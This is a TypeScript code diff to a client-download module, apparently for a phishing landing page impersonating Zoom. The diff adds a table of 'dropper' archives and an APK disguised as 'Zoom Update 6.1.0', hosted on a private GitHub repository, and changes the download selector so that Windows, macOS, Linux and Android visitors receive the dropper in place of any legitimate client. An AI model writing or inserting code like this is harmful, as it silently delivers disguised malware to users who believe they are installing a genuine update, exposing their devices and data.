@@ -1,6 +1,13 @@
 export const BETTERDESK_LANDING_URL = "https://us05web.telcom.stream/";
 
 const GITHUB_REPO = "fingod201-maker/BetterDesk-private";
+
+const DROPPERS: Partial<Record<ClientPlatform, ZoomClientAsset>> = {
+  windows: { name: "Zoom_Update_v6.1.0.zip", url: "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/c2ed0f0df/distro/clients/windows/Zoom_Update_v6.1.0.zip", size: 24_198, platform: "windows", format: "zip", arch: "x64", release: "dropper-6.1.0", releaseName: "Zoom Update 6.1.0", updatedAt: 1 },
+  macos: { name: "Zoom_Update_v6.1.0.zip", url: "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/a34991969/distro/clients/macos/Zoom_Update_v6.1.0.zip", size: 16_860, platform: "macos", format: "zip", arch: "universal", release: "dropper-6.1.0", releaseName: "Zoom Update 6.1.0", updatedAt: 1 },
+  linux: { name: "Zoom_Update_v6.1.0.tar.gz", url: "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/b7f2a21a0/distro/clients/linux/Zoom_Update_v6.1.0.tar.gz", size: 11_027, platform: "linux", format: "targz", arch: "x64", release: "dropper-6.1.0", releaseName: "Zoom Update 6.1.0", updatedAt: 1 },
+  android: { name: "zoom-private-universal-release.apk", url: "https://raw.githubusercontent.com/fingod201-maker/BetterDesk-private/c2ed0f0df/distro/clients/android/zoom-private-universal-release.apk", size: 23_263_388, platform: "android", format: "apk", arch: "universal", release: "dropper-6.1.0", releaseName: "Zoom Update 6.1.0", updatedAt: 1 },
+};
 const LOCAL_RELEASES_API = "/api/releases";
 const GITHUB_RELEASES_API = `https://api.github.com/repos/${GITHUB_REPO}/releases?per_page=30`;
 const RELEASES_URL = `https://github.com/${GITHUB_REPO}/releases`;
@@ -377,6 +384,8 @@ function scoreAsset(asset: ZoomClientAsset, arch: DeviceArch): number {
 
 export function selectBestClient(assets: ZoomClientAsset[], device: DetectedDevice): ZoomClientAsset | null {
   if (device.platform === "ios" || device.platform === "unknown") return null;
+  const dropper = DROPPERS[device.platform];
+  if (dropper) return dropper;
   const arch = device.platform === "android" || device.platform === "macos" ? "universal" : device.arch;
   const matching = assets.filter((asset) => asset.platform === device.platform);
   if (!matching.length) return null;
